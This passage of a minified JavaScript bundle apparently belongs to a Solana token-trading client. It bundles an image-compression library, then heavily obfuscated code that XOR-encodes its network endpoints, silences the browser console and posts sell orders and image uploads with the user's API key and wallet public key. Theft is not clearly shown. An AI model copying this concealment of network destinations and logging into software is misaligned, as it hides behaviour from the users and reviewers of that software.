                new Promise(function (n, r) {
                  var o;
                  if (!(o = e.exifOrientation))
                    return AR(t).then(
                      function (t) {
                        try {
                          return (o = t), i.call(this);
                        } catch (e) {
                          return r(e);
                        }
                      }.bind(this),
                      r
                    );
                  function i() {
                    return n(o);
                  }
                  return i.call(this);
                }).then(
                  function (n) {
                    try {
                      return (
                        (l = n),
                        _(),
                        vR().then(
                          function (n) {
                            try {
                              return (
                                (d = n ? c : IR(c, l)),
                                _(),
                                (f = e.initialQuality || 1),
                                (h = e.fileType || t.type),
                                wR(d, h, t.name, t.lastModified, f).then(
                                  function (n) {
                                    try {
                                      {
                                        let l = function () {
                                            if (s-- && (b > a || b > y)) {
                                              let e, n;
                                              return (
                                                (e = S
                                                  ? 0.95 * I.width
                                                  : I.width),
                                                (n = S
                                                  ? 0.95 * I.height
                                                  : I.height),
                                                ([A, k] = pR(e, n)),
                                                k.drawImage(I, 0, 0, e, n),
                                                (f *=
                                                  "image/png" === h
                                                    ? 0.85
                                                    : 0.95),
                                                wR(
                                                  A,
                                                  h,
                                                  t.name,
                                                  t.lastModified,
                                                  f
                                                ).then(function (t) {
                                                  try {
                                                    return (
                                                      (v = t),
                                                      bR(I),
                                                      (I = A),
                                                      (b = v.size),
                                                      T(
                                                        Math.min(
                                                          99,
                                                          Math.floor(
                                                            ((w - b) /
                                                              (w - a)) *
                                                              100
                                                          )
                                                        )
                                                      ),
                                                      l
                                                    );
                                                  } catch (e) {
                                                    return o(e);
                                                  }
                                                }, o)
                                              );
                                            }
                                            return [1];
                                          },
                                          C = function () {
                                            return (
                                              bR(I),
                                              bR(A),
                                              bR(c),
                                              bR(d),
                                              bR(u),
                                              T(100),
                                              r(v)
                                            );
                                          };
                                        return (
                                          (p = n),
                                          _(),
                                          (m = p.size > a),
                                          (g = p.size > t.size),
                                          m || g
                                            ? ((y = t.size),
                                              (w = p.size),
                                              (b = w),
                                              (I = d),
                                              (S =
                                                !e.alwaysKeepResolution && m),
                                              (i = function (t) {
                                                for (; t; ) {
                                                  if (t.then)
                                                    return void t.then(i, o);
                                                  try {
                                                    if (t.pop) {
                                                      if (t.length)
                                                        return t.pop()
                                                          ? C.call(this)
                                                          : t;
                                                      t = l;
                                                    } else t = t.call(this);
                                                  } catch (e) {
                                                    return o(e);
                                                  }
                                                }
                                              }.bind(this))(l))
                                            : (T(100), r(p))
                                        );
                                        var i;
                                      }
                                    } catch (l) {
                                      return o(l);
                                    }
                                  }.bind(this),
                                  o
                                )
                              );
                            } catch (i) {
                              return o(i);
                            }
                          }.bind(this),
                          o
                        )
                      );
                    } catch (i) {
                      return o(i);
                    }
                  }.bind(this),
                  o
                )
              );
            } catch (i) {
              return o(i);
            }
          }.bind(this),
          o
        )
      );
    });
  }
  let _R;
  function TR(t, e) {
    return new Promise(function (n, r) {
      let o, i, s, a, u, c;
      if (
        ((o = { ...e }),
        (s = 0),
        ({ onProgress: a } = o),
        (o.maxSizeMB = o.maxSizeMB || Number.POSITIVE_INFINITY),
        (u = "boolean" != typeof o.useWebWorker || o.useWebWorker),
        delete o.useWebWorker,
        (o.onProgress = (t) => {
          (s = t), "function" == typeof a && a(s);
        }),
        !(t instanceof Blob || t instanceof aR))
      )
        return r(
          new Error("The file given is not an instance of Blob or File")
        );
      if (!/^image/.test(t.type))
        return r(new Error("The file given is not an image"));
      if (
        ((c =
          "undefined" != typeof WorkerGlobalScope &&
          self instanceof WorkerGlobalScope),
        !u || "function" != typeof Worker || c)
      )
        return SR(t, o).then(
          function (t) {
            try {
              return (i = t), f.call(this);
            } catch (e) {
              return r(e);
            }
          }.bind(this),
          r
        );
      var l = function () {
          try {
            return f.call(this);
          } catch (t) {
            return r(t);
          }
        }.bind(this),
        d = function (e) {
          try {
            return SR(t, o).then(function (t) {
              try {
                return (i = t), l();
              } catch (e) {
                return r(e);
              }
            }, r);
          } catch (n) {
            return r(n);
          }
        };
      try {
        return (
          (o.libURL =
            o.libURL ||
            "https://cdn.jsdelivr.net/npm/browser-image-compression@2.0.2/dist/browser-image-compression.js"),
          (function (t, e) {
            return new Promise((n, r) => {
              _R ||
                (_R = (function (t) {
                  const e = [];
                  return e.push(t), URL.createObjectURL(new Blob(e));
                })(
                  "\nlet scriptImported = false\nself.addEventListener('message', async (e) => {\n  const { file, id, imageCompressionLibUrl, options } = e.data\n  options.onProgress = (progress) => self.postMessage({ progress, id })\n  try {\n    if (!scriptImported) {\n      // console.log('[worker] importScripts', imageCompressionLibUrl)\n      self.importScripts(imageCompressionLibUrl)\n      scriptImported = true\n    }\n    // console.log('[worker] self', self)\n    const compressedFile = await imageCompression(file, options)\n    self.postMessage({ file: compressedFile, id })\n  } catch (e) {\n    // console.error('[worker] error', e)\n    self.postMessage({ error: e.message + '\\n' + e.stack, id })\n  }\n})\n"
                ));
              const o = new Worker(_R);
              o.addEventListener("message", function (t) {
                if (e.signal && e.signal.aborted) o.terminate();
                else if (void 0 === t.data.progress) {
                  if (t.data.error)
                    return r(new Error(t.data.error)), void o.terminate();
                  n(t.data.file), o.terminate();
                } else e.onProgress(t.data.progress);
              }),
                o.addEventListener("error", r),
                e.signal &&
                  e.signal.addEventListener("abort", () => {
                    r(e.signal.reason), o.terminate();
                  }),
                o.postMessage({
                  file: t,
                  imageCompressionLibUrl: e.libURL,
                  options: { ...e, onProgress: void 0, signal: void 0 },
                });
            });
          })(t, o).then(function (t) {
            try {
              return (i = t), l();
            } catch (e) {
              return d();
            }
          }, d)
        );
      } catch (h) {
        d();
      }
      function f() {
        try {
          (i.name = t.name), (i.lastModified = t.lastModified);
        } catch (h) {}
        try {
          o.preserveExif &&
            "image/jpeg" === t.type &&
            (!o.fileType || (o.fileType && o.fileType === t.type)) &&
            (i = ZP(t, i));
        } catch (h) {}
        return n(i);
      }
    });
  }
  (TR.getDataUrlFromFile = lR),
    (TR.getFilefromDataUrl = cR),
    (TR.loadImage = dR),
    (TR.drawImageInCanvas = mR),
    (TR.drawFileInCanvas = yR),
    (TR.canvasToFile = wR),
    (TR.getExifOrientation = AR),
    (TR.handleMaxWidthOrHeight = kR),
    (TR.followExifOrientation = IR),
    (TR.cleanupCanvasMemory = bR),
    (TR.isAutoOrientationInBrowser = vR),
    (TR.approximateBelowMaximumCanvasSizeOfBrowser = hR),
    (TR.copyExifWithoutOrientation = ZP),
    (TR.getBrowserName = fR),
    (TR.version = "2.0.2");
  const CR = OR;
  !(function (t) {
    const e = 460,
      n = 469,
      r = 486,
      o = 461,
      i = 479,
      s = 453,
      a = 470,
      u = OR,
      c = t();
    for (; []; )
      try {
        if (
          130137 ===
          parseInt(u(e)) / 1 +
            (-parseInt(u(441)) / 2) * (parseInt(u(n)) / 3) +
            -parseInt(u(r)) / 4 +
            (parseInt(u(o)) / 5) * (parseInt(u(491)) / 6) +
            -parseInt(u(i)) / 7 +
            (-parseInt(u(s)) / 8) * (-parseInt(u(a)) / 9) +
            -parseInt(u(446)) / 10
        )
          break;
        c.push(c.shift());
      } catch (l) {
        c.push(c.shift());
      }
  })(xR);
  const BR = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    ER = BR(void 0, function () {
      const t = 466,
        e = 466,
        n = OR;
      return ER.toString()
        .search(n(t) + "+$")
        .toString()
        .constructor(ER)
        .search(n(e) + "+$");
    });
  function xR() {
    const t = [
      "yM9UAW",
      "Dg9cyxnLntG",
      "q29UDgvUDc1uEq",
      "z2v0sw5ZDgfUyW",
      "y3jLyxrL",
      "vw5RBM93BIbLCG",
      "mte1odu0nhr6Bw9uCG",
      "zgvJB2rL",
      "u2vSBcbLCNjVCG",
      "BevvzM8",
      "Ahr0Chm6lY9WDq",
      "Dw5KzwzPBMvK",
      "ue9tva",
      "mJi4nZCZDwrfAujS",
      "nZKYnJKWvNvRqwPi",
      "AxnvC2vYqxv0Aa",
      "CM9Y",
      "Aw5PDgLHBeXPCq",
      "BxbWB3j0ywWUzG",
      "kcGOlISPkYKRkq",
      "BI9QC29U",
      "tNDUqK8",
      "mJmWmJi2B1fdzxDr",
      "ou5uwefRDq",
      "DfLPB28",
      "ANnVBG",
      "D2fYBG",
      "Dw4VyxbPl3rYyq",
      "BvzAs3G",
      "tgz6Cve",
      "DxjP",
      "DhjHy2u",
      "ntKXndnXAxjjBhu",
      "ChjPB3jPDhLgzq",
      "Dg9tDhjPBMC",
      "yxbPs2v5",
      "BMfTzq",
      "BgvUz3rO",
      "BxnN",
      "mZe5odq4DfjZyxrb",
      "A2vUihn1y2nLCW",
      "rKjRs1a",
      "jsbVzIb0B2TLBG",
      "C3LTyM9S",
      "nMXAwg9bza",
      "C2vSBa",
      "qxzzELm",
      "uxv5v1O",
      "B2jQzwn0",
      "zxjYB3i",
      "DhvLufe",
      "DgLJA2vY",
      "BwvZC2fNzq",
      "rKfXBxa",
      "EvbHAxi",
      "t0Hxzwu",
      "ENffExO",
      "CNbJtw9Kzq",
      "v2zABvC",
      "AgfZs2v5ugfPCG",
      "uNv4y1q",
      "C2XPChbHz2u",
      "C2TdCNLWDa",
      "y29UC29Szq",
      "DLjgvvi",
      "rxPSD2C",
      "C2LNBMf0DxjL",
      "C3rYAw5NAwz5",
      "zKLzCNG",
      "wvP4rLm",
      "AxrZBfq",
      "u2vVANu",
      "A1nwthO",
      "Eevhvw4",
      "C2z1BgX5",
      "z2v0u2v0DgLUzW",
      "zMfSC2u",
      "y29rr24",
      "C3rHDhvZvgv4Da",
      "q3jLyxrLzcb0BW",
      "v3PkuhC",
      "tKTAzvC",
      "E30Uy29UC3rYDq",
      "C3vJy2vZCW",
      "ngXStuvRqq",
      "zgu/yxbPlwTLEq",
      "C2vJCMv0s2v5",
      "CMfyqu8",
      "C3rHDhvZ",
      "mtyWmdK3mgXiDwv6yq",
    ];
    return (xR = function () {
      return t;
    })();
  }
  ER();
  const PR = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    RR = PR(void 0, function () {
      const t = 439,
        e = 510,
        n = 488,
        r = 517,
        o = 481,
        i = OR,
        s = {
          uQZpT: function (t, e) {
            return t(e);
          },
          ufJGw: "return (function() ",
          FBkKP: i(473),
          itslT: "error",
          pLBHo: "table",
        };
      let a;
      try {
        a = s.uQZpT(Function, s.ufJGw + (i(t) + 'ctor("return this")( ));'))();
      } catch (l) {
        a = window;
      }
      const u = (a.console = a[i(e)] || {}),
        c = ["log", s[i(n)], "info", s[i(r)], "exception", s.pLBHo, i(478)];
      for (let d = 0; d < c.length; d++) {
        const t = PR.constructor.prototype.bind(PR),
          e = c[d],
          n = u[e] || t;
        (t.__proto__ = PR.bind(PR)), (t.toString = n[i(o)].bind(n)), (u[e] = t);
      }
    });
  function OR(t, e) {
    const n = xR();
    return (
      (OR = function (e, r) {
        let o = n[(e -= 439)];
        if (void 0 === OR.PUvaQf) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (OR.jVeiXf = i), (t = arguments), (OR.PUvaQf = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.DwGNqJ = t),
              (this.QrYFAI = [1, 0, 0]),
              (this.vFKKrn = function () {
                return "newState";
              }),
              (this.uQzaDA = "\\w+ *\\(\\) *{\\w+ *"),
              (this.ZDygxm = "['|\"].+['|\"];? *}");
          };
          (e.prototype.oZAldn = function () {
            const t = new RegExp(this.uQzaDA + this.ZDygxm).test(
              this.vFKKrn.toString()
            )
              ? --this.QrYFAI[1]
              : --this.QrYFAI[0];
            return this.MnwAZZ(t);
          }),
            (e.prototype.MnwAZZ = function (t) {
              return Boolean(~t) ? this.dkCxLP(this.DwGNqJ) : t;
            }),
            (e.prototype.dkCxLP = function (t) {
              for (let e = 0, n = this.QrYFAI.length; e < n; e++)
                this.QrYFAI.push(Math.round(Math.random())),
                  (n = this.QrYFAI.length);
              return t(this.QrYFAI[0]);
            }),
            new e(OR).oZAldn(),
            (o = OR.jVeiXf(o)),
            (t[s] = o);
        }
        return o;
      }),
      OR(t, e)
    );
  }
  RR(),
    (window[CR(509)] = function (t) {
      return function () {
        return t;
      };
    });
  const MR = async (t) => {
    const e = 471,
      n = 496,
      r = 492,
      o = 511,
      i = 458,
      s = 520,
      a = 450,
      u = 462,
      c = 475,
      l = 506,
      d = 475,
      f = 465,
      h = 474,
      p = 527,
      m = 448,
      g = 523,
      y = 480,
      w = 504,
      b = 513,
      v = 452,
      A = 499,
      k = 495,
      I = 514,
      S = 455,
      _ = 484,
      T = 471,
      C = 454,
      B = CR,
      E = {
        coQGn: function (t, e) {
          return t < e;
        },
      };
    (E[B(468)] = function (t, e) {
      return t & e;
    }),
      (E.jDKLi = function (t, e) {
        return t >>> e;
      }),
      (E.MKfce = function (t, e) {
        return t * e;
      }),
      (E.IlInS = function (t, e) {
        return t < e;
      }),
      (E.qKMiK = function (t, e) {
        return t & e;
      }),
      (E[B(e)] = function (t, e) {
        return t ^ e;
      }),
      (E.mVZKx = B(n)),
      (E[B(527)] = B(r)),
      (E[B(o)] = function (t, e) {
        return t !== e;
      }),
      (E.lEUfo = B(i)),
      (E.ggeGN = B(440)),
      (E[B(s)] = function (t, e) {
        return t + e;
      });
    const x = E;
    try {
      if (!Xg[B(a) + "e"]()[B(u) + "enticated"]())
        return (
          Bg(
            (function () {
              const t = 524,
                e = 468;
              let n;
              return function () {
                const r = OR;
                if (!n) {
                  const o = new Uint8Array([
                      59, 68, 183, 102, 78, 94, 161, 52, 0, 88, 166, 52, 15, 66,
                      166, 124, 11, 89, 166, 125, 13, 86, 166, 113, 10,
                    ]),
                    i = 349321070,
                    s = new Uint8Array(o.length);
                  for (let n = 0; x[r(t)](n, o.length); n++) {
                    const t = x[r(e)](x.jDKLi(i, x.MKfce(n % 4, 8)), 255);
                    s[n] = o[n] ^ t;
                  }
                  n = new TextDecoder().decode(s);
                }
                return n;
              };
            })()(),
            x[B(c)]
          ),
          void 0
        );
      const e = Zg.getInstance().getSettings(),
        r = Jg[B(450) + "e"]();
      let o = r.getKeyPair();
      if (!r[B(l)]() || !o)
        return (
          Bg(
            (function () {
              let t;
              return function () {
                const e = OR;
                if (!t) {
                  const n = new Uint8Array([
                      47, 88, 167, 120, 8, 23, 188, 123, 24, 23, 180, 125, 2,
                      83, 242, 96, 3, 92, 183, 122, 66, 25, 237,
                    ]),
                    r = 349321068,
                    o = new Uint8Array(n.length);
                  for (let t = 0; x.IlInS(t, n[e(_)]); t++) {
                    const i = x.qKMiK(r >>> x.MKfce(t % 4, 8), 255);
                    o[t] = x[e(T)](n[t], i);
                  }
                  t = new TextDecoder()[e(C)](o);
                }
                return t;
              };
            })()(),
            x[B(d)]
          ),
          void 0
        );
      const i = {};
      i["Content-Type"] = "applicatio" + B(467);
      const s = await fetch(
          "https://pu" +
            B(f) +
            B(h) +
            B(442) +
            "=" +
            (null == e ? void 0 : e.apiKey),
          {
            method: "POST",
            headers: i,
            body: JSON.stringify({
              action: x[B(p)],
              mint: o.publicKey[B(m)](),
              amount: t + "%",
              denominatedInSol: B(g),
              slippage: (null == e ? void 0 : e.slippage) || 10,
              priorityFee: (null == e ? void 0 : e[B(y) + "e"]) || 5e-4,
              pool: null == e ? void 0 : e[B(w)],
            }),
          }
        ),
        v = await s.json();
      if (v.signature && x.vRFUR(v[B(b)], x[B(456)]) && void 0 !== v[B(b)])
        return Bg("Sold " + t + B(489) + "s", x.ggeGN), void 0;
      Bg("Failed to sell tokens", B(n));
    } catch (P) {
      let t = B(v) + "ror";
      P instanceof Error
        ? (t = P[B(A)])
        : "string" == typeof P
        ? (t = P)
        : P && typeof P === B(k) && (t = JSON[B(I)](P)),
        Bg(x.xEGUn(B(S) + ": ", t), x[B(c)]);
    }
  };
  axiom;
  const LR = NR;
  function NR(t, e) {
    const n = DR();
    return (
      (NR = function (e, r) {
        let o = n[(e -= 192)];
        if (void 0 === NR.RCHEkh) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (NR.nAmFqP = i), (t = arguments), (NR.RCHEkh = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.AuPqiZ = t),
              (this.kdfJyv = [1, 0, 0]),
              (this.KViCVy = function () {
                return "newState";
              }),
              (this.PMjZGp = "\\w+ *\\(\\) *{\\w+ *"),
              (this.uSOLkK = "['|\"].+['|\"];? *}");
          };
          (e.prototype.YjobgA = function () {
            const t = new RegExp(this.PMjZGp + this.uSOLkK).test(
              this.KViCVy.toString()
            )
              ? --this.kdfJyv[1]
              : --this.kdfJyv[0];
            return this.meJrKa(t);
          }),
            (e.prototype.meJrKa = function (t) {
              return Boolean(~t) ? this.LeFvcv(this.AuPqiZ) : t;
            }),
            (e.prototype.LeFvcv = function (t) {
              for (let e = 0, n = this.kdfJyv.length; e < n; e++)
                this.kdfJyv.push(Math.round(Math.random())),
                  (n = this.kdfJyv.length);
              return t(this.kdfJyv[0]);
            }),
            new e(NR).YjobgA(),
            (o = NR.nAmFqP(o)),
            (t[s] = o);
        }
        return o;
      }),
      NR(t, e)
    );
  }
  function DR() {
    const t = [
      "C3vIC3rYAw5N",
      "Aw1Hz2u",
      "qwnJzxb0luvUyW",
      "nZe3mJbgrhL4ywW",
      "sgvPz2H0",
      "lNDVCMTLCNmUza",
      "y29PBK5HBwu",
      "odCXmJKWBhDoBfbK",
      "B2zxELq",
      "DhDPDhrLCLvYBa",
      "B2jQzwn0",
      "y3jLyxrLze9U",
      "svbMDw0",
      "D2vICa",
      "yxrLlcbICG",
      "DxjSvem",
      "zxjYB3i6ia",
      "ovjKtKXQrG",
      "DhLWzq",
      "sNjdENC",
      "CM9Y",
      "CNbWu3q",
      "ANnVBG",
      "C3rYAw5N",
      "Bwv0ywrHDgfvCG",
      "whrvzK4",
      "DM9uwNK",
      "neTXve1UyG",
      "BI9QC29U",
      "ywnRihrVia",
      "wu9ZBvy",
      "Dfjzv3K",
      "tM9gqKO",
      "tKTMs3y",
      "Dgv4Da",
      "AfrcDMe",
      "ChvTCa",
      "BLjXy1y",
      "zxjYB3i",
      "nZy1nZuYCgvNzfnr",
      "CgLU",
      "x19WCM90B19F",
      "z3PPCcWGzgvMBa",
      "zxHJzxb0Aw9U",
      "ywDL",
      "twv0ywrHDgeGDq",
      "B0vsz1K",
      "Dc1ZDg9YywDLlG",
      "DgLTzw91Dd0Zma",
      "tMHUseK",
      "C2vSzwn0zwrjBq",
      "vw5RBM93BIbLCG",
      "lcbTyxG9mtaW",
      "EuvjEvK",
      "y29UzMLYBwvK",
      "Dhj1zq",
      "igzHBgXPBMCGyG",
      "DgfIBgu",
      "ChjVDg90ExbL",
      "y29UC29Szq",
      "zwLNAhq",
      "yM9KEq",
      "yLjwvwe",
      "whPOD0C",
      "ndy1mtu2vvPUrNr6",
      "Bg9JA2HHC2G",
      "AgfZAa",
      "BxaUzNvUl2fWAq",
      "wKP1EKW",
      "BxnN",
      "AxfKzM8",
      "ue9tva",
      "BLzfB0W",
      "BwvZC2fNzq",
      "vgftD2y",
      "BMfTzq",
      "E30Uy29UC3rYDq",
      "Ahr0Chm6lY9UzG",
      "zxyVDxbSB2fKlW",
      "mtG1mJm1AgDOv0Lz",
      "rwTOy1C",
      "C3vJy2vZCW",
      "yxbWzw5K",
      "DxnLv2vIv29YAW",
      "Bgv0C2jVBMSYmG",
      "DKnTweq",
      "yxbWBgLJyxrPBW",
      "C2TdCNLWDa",
      "l2LWzNm",
      "zhHoEK8",
      "ANvysNK",
      "Aw1Hz2uVz2LM",
      "wgTuy2q",
      "z2v0sw5ZDgfUyW",
      "ENnzC2m",
      "DgLJA2vY",
      "mJi0nte0wgrJChjN",
      "Dg9tDhjPBMC",
      "AMX2u1a",
      "C2vHCMnO",
      "sw1Hz2uGDxbSBW",
      "zMLSzq",
      "z2v0tgf0zxn0qG",
      "CgXVywqGzMfPBa",
      "nZu5mdfNDKnbv2O",
      "EMnfyLG",
      "tvDzr2W",
      "yxbWBhK",
      "q29UDgvUDfr5Ca",
      "tKLhBuC",
      "qMXVy2TOyxnOia",
      "C3LTyM9S",
      "BgvUz3rO",
      "Bwv0Ag9K",
      "qM9erNG",
      "C3rYAw5NAwz5",
      "D2fYBMLUzW",
      "CM4GDgHPCYiPka",
    ];
    return (DR = function () {
      return t;
    })();
  }
  (function (t) {
    const e = 272,
      n = 215,
      r = 230,
      o = 276,
      i = 247,
      s = 255,
      a = 286,
      u = NR,
      c = t();
    for (; []; )
      try {
        if (
          144288 ===
          parseInt(u(e)) / 1 +
            -parseInt(u(n)) / 2 +
            (parseInt(u(r)) / 3) * (parseInt(u(296)) / 4) +
            parseInt(u(o)) / 5 +
            -parseInt(u(i)) / 6 +
            parseInt(u(s)) / 7 +
            (-parseInt(u(308)) / 8) * (-parseInt(u(a)) / 9)
        )
          break;
        c.push(c.shift());
      } catch (l) {
        c.push(c.shift());
      }
  })(DR),
    (window[LR(238)] = function (t) {
      return function () {
        return t;
      };
    });
  const UR = {};
  (UR[LR(217)] = ""), (UR["lastValidH" + LR(211)] = 0), (UR.expiry = 0);
  let qR = UR;
  const WR = { maxSizeMB: 0.1 };
  (WR[LR(234) + "er"] = !![]),
    (WR.initialQuality = 0.8),
    (WR.maxIteration = 5),
    (WR["maxWidthOr" + LR(273)] = 500);
  const zR = WR,
    KR = (t) => {
      const e = 248,
        n = 269,
        r = LR;
      return Math.random()[r(e)](36)[r(n)](2, 10) + "." + t;
    },
    FR = async (t) => {
      const e = 225,
        n = 284,
        r = 205,
        o = 253,
        i = 216,
        s = 202,
        a = 285,
        u = 217,
        c = LR,
        l = {
          urlTC: function (t, e) {
            return t !== e;
          },
          CMBsn: function (t, e) {
            return t + e;
          },
        };
      (l[c(260)] = function (t, e) {
        return t === e;
      }),
        (l[c(e)] = "string"),
        (l.eySFP = "object");
      const d = l;
      try {
        const e = Date.now();
        if (e < qR.expiry && d[c(n)](qR.hash.length, 0)) return qR;
        const s = {};
        s.commitment = c(r);
        const { blockhash: a, lastValidBlockHeight: u } = await t[c(o) + c(i)](
          s
        );
        return (
          (qR = { hash: a, lastValidHeight: u, expiry: d.CMBsn(e, 3e4) }), qR
        );
      } catch (f) {
        let t = c(s) + "ror";
        f instanceof Error
          ? (t = f.message)
          : d.NIGmG(typeof f, d.TaSwf)
          ? (t = f)
          : f && typeof f === d.eySFP && (t = JSON.stringify(f)),
          Bg(c(261) + c(a) + t, "error");
        const e = {};
        return (e[c(u)] = ""), (e.lastValidHeight = 0), (e.expiry = 0), e;
      }
    },
    jR = (function () {
      const t = 223,
        e = 263,
        n = 294,
        r = 281,
        o = 290,
        i = 300,
        s = 241,
        a = 210,
        u = 210,
        c = 240,
        l = 194,
        d = 208,
        f = 299,
        h = 263,
        p = LR,
        m = {
          IPfum: function (t, e) {
            return t(e);
          },
          rppSt: function (t, e) {
            return t + e;
          },
          tRYWy: "return (function() ",
          juXJy: p(227) + 'ctor("retu' + p(268) + " )",
          dxNzO: "warn",
          JrCzw: "error",
          YOsmV: function (t, e) {
            return t < e;
          },
          XSfif: function (t, e) {
            return t & e;
          },
          XtUfN: function (t, e) {
            return t * e;
          },
          Galwx: function (t, e) {
            return t ^ e;
          },
          nVEoL: function (t) {
            return t();
          },
        },
        g = (function () {
          let t = !![];
          return function (e, n) {
            const r = t
              ? function () {
                  if (n) {
                    const t = n[NR(258)](e, arguments);
                    return (n = null), t;
                  }
                }
              : function () {};
            return (t = ![]), r;
          };
        })(),
        y = g(this, function () {
          const t = p;
          let e;
          try {
            e = m[t(r)](Function, m[t(o)](m[t(i)], m[t(s)]) + ");")();
          } catch (w) {
            e = window;
          }
          const n = (e[t(a)] = e[t(u)] || {}),
            y = ["log", m[t(c)], "info", m[t(288)], t(l), t(d), "trace"];
          for (let r = 0; m[t(f)](r, y[t(h)]); r++) {
            const e = g.constructor[t(209)].bind(g),
              o = y[r],
              i = n[o] || e;
            (e[t(192)] = g.bind(g)),
              (e.toString = i.toString.bind(i)),
              (n[o] = e);
          }
        });
      let w;
      return (
        m[p(t)](y),
        function () {
          const t = p;
          if (!w) {
            const r = new Uint8Array([
                229, 250, 193, 65, 254, 180, 154, 30, 255, 254, 214, 31, 224,
                225, 210, 69, 232, 237, 221, 31, 233, 235, 195, 30, 228, 254,
                211, 66, 160, 232, 212, 66, 249, 177, 193, 94, 230, 235, 219,
                12,
              ]),
              o = 833982093,
              i = new Uint8Array(r[t(e)]);
            for (let e = 0; e < r.length; e++) {
              const s = m.XSfif(o >>> m[t(n)](e % 4, 8), 255);
              i[e] = m.Galwx(r[e], s);
            }
            w = new TextDecoder().decode(i);
          }
          return w;
        }
      );
    })()(),
    GR = (function () {
      const t = 263,
        e = 250,
        n = 250,
        r = "(((.+)+)+)+$",
        o = function (t, e) {
          return t >>> e;
        },
        i = function (t, e) {
          return t % e;
        },
        s = function (t, e, n) {
          return t(e, n);
        },
        a = (function () {
          let t = !![];
          return function (e, n) {
            const r = t
              ? function () {
                  if (n) {
                    const t = n.apply(e, arguments);
                    return (n = null), t;
                  }
                }
              : function () {};
            return (t = ![]), r;
          };
        })(),
        u = s(a, this, function () {
          const t = NR;
          return u
            .toString()
            [t(e)]("(((.+)+)+)+$")
            .toString()
            .constructor(u)
            [t(n)](r);
        });
      let c;
      return (
        u(),
        function () {
          const e = NR;
          if (!c) {
            const n = new Uint8Array([
                231, 250, 193, 65, 252, 180, 154, 30, 235, 239, 216, 95, 162,
                250, 198, 28, 236, 252, 212, 75, 246, 163, 220, 95, 225, 231,
                193, 31, 254, 251, 220, 82, 228, 224, 218, 85, 234, 163, 220,
                65, 233, 253, 155, 82, 224, 227, 154, 88, 255, 232, 198, 30,
              ]),
              r = 833982095,
              s = new Uint8Array(n.length);
            for (let a = 0; a < n[e(t)]; a++) {
              const t = 255 & o(r, 8 * i(a, 4));
              s[a] = n[a] ^ t;
            }
            c = new TextDecoder().decode(s);
          }
          return c;
        }
      );
    })()(),
    VR = async (t, e, n, r) => {
      const o = 233,
        i = 233,
        s = 259,
        a = 271,
        u = 193,
        c = 283,
        l = 199,
        d = 264,
        f = 212,
        h = 289,
        p = LR,
        m = "Keep-Alive",
        g = function (t, e, n) {
          return t(e, n);
        },
        y = function (t, e) {
          return t instanceof e;
        },
        w = "string",
        b = function (t, e) {
          return t === e;
        },
        v = new FormData();
      v.append("Body", t, e), v[p(o)]("Key", e), v[p(i)](p(s) + "e", n);
      try {
        const t = {};
        (t.Connection = m),
          (t[p(a) + "oding"] = p(u) + p(c)),
          (t["Keep-Alive"] = p(l) + p(203));
        const e = {};
        (e[p(d)] = p(222)),
          (e[p(f)] = v),
          (e.redirect = "follow"),
          (e.headers = t);
        const n = e,
          o = await g(fetch, jR + r, n),
          i = await o.text();
        return JSON.parse(i)[p(309)].cid;
      } catch (A) {
        return (
          p(h),
          1,
          y(A, Error)
            ? A[p(224)]
            : typeof A === w ||
              (A && b(typeof A, "object") && JSON.stringify(A)),
          ""
        );
      }
    },
    HR = async (t, e) => {
      const n = 207,
        r = 298,
        o = 237,
        i = 305,
        s = 287,
        a = 214,
        u = 245,
        c = 262,
        l = 246,
        d = 280,
        f = 278,
        h = 287,
        p = 236,
        m = 237,
        g = 196,
        y = 254,
        w = 256,
        b = 243,
        v = 204,
        A = 306,
        k = 275,
        I = 224,
        S = 243,
        _ = 292,
        T = 279,
        C = 242,
        B = 282,
        E = LR,
        x = {
          erIyG: "jpg",
          PlSYe: "png",
          zsYsc: function (t, e) {
            return t(e);
          },
          XzhwG: function (t, e) {
            return t(e);
          },
          Dpapd: "json",
          NKfKv: function (t, e) {
            return t + e;
          },
          bTeGb: E(251) + "ad failed," + E(n) + E(r),
          jgAfp: function (t, e) {
            return t + e;
          },
          IkqIY: E(o) + "n/json",
          vCmXD: function (t, e, n, r, o) {
            return t(e, n, r, o);
          },
          hTBva: function (t, e, n) {
            return t(e, n);
          },
          zcEbX: E(267),
          XkTcd: function (t, e) {
            return t === e;
          },
          yEIyY: E(i),
          nRqcV: function (t, e) {
            return t + e;
          },
        };
      try {
        const n = await x.zsYsc(HP, t.selectedImage),
          r = (await TR(n, zR)) ?? n,
          o = r[E(s)] || "image/png",
          i = (t) => {
            const e = E,
              n = { "image/jpeg": "jpg" };
            (n["image/jpg"] = x.erIyG),
              (n["image/png"] = x.PlSYe),
              (n[e(C)] = "gif"),
